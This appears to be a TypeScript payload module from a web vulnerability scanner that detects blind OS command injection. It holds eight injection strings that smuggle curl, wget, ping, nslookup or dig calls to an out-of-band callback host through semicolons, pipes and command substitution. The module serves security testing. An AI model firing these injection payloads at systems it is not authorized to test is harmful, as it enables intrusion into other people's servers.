import type { PayloadVariant, MutationContext } from '../types';

export const META = {
  id: 'command-injection-blind-oast',
  family: 'command-injection-blind-oast' as const,
  name: 'Command Injection (Blind, OAST)',
  description: 'Detects blind OS command injection via out-of-band DNS/HTTP callback probes.',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['query', 'body', 'json', 'header', 'path'],
};

export function variants(ctx: MutationContext): PayloadVariant[] {
  if (!ctx.oastBaseUrl || !ctx.oastToken) return [];
  const token = ctx.oastToken;
  const base = ctx.oastBaseUrl;
  const probes = [
    { value: `; curl http://${token}.${base}/ci`, intent: 'curl HTTP OAST callback via semicolon separator', signals: ['oast-callback-confirmed'] },
    { value: `| curl http://${token}.${base}/ci`, intent: 'curl HTTP OAST callback via pipe operator', signals: ['oast-callback-confirmed'] },
    { value: `$(curl http://${token}.${base}/ci)`, intent: 'curl OAST in $() substitution', signals: ['oast-callback-confirmed'] },
    { value: `; wget -q http://${token}.${base}/ci`, intent: 'wget HTTP OAST callback via semicolon separator', signals: ['oast-callback-confirmed'] },
    { value: `; ping -c 1 ${token}.${base}`, intent: 'ping DNS OAST — triggers DNS resolution to OAST host', signals: ['oast-callback-confirmed'] },
    { value: `; nslookup ${token}.${base}`, intent: 'nslookup DNS OAST callback', signals: ['oast-callback-confirmed'] },
    { value: `; dig ${token}.${base}`, intent: 'dig DNS OAST callback', signals: ['oast-callback-confirmed'] },
    { value: `\`curl http://${token}.${base}/ci\``, intent: 'curl OAST in backtick substitution', signals: ['oast-callback-confirmed'] },
  ];
  return probes.map((p, i) => ({
    id: `cmd-blind-oast-${i + 1}`,
    family: 'command-injection-blind-oast' as const,
    value: p.value,
    encoding: 'raw' as const,
    intent: p.intent,
    requiresOast: true,
    requiresBrowser: false,
    destructiveRisk: 'none' as const,
    expectedSignals: p.signals,
  }));
}
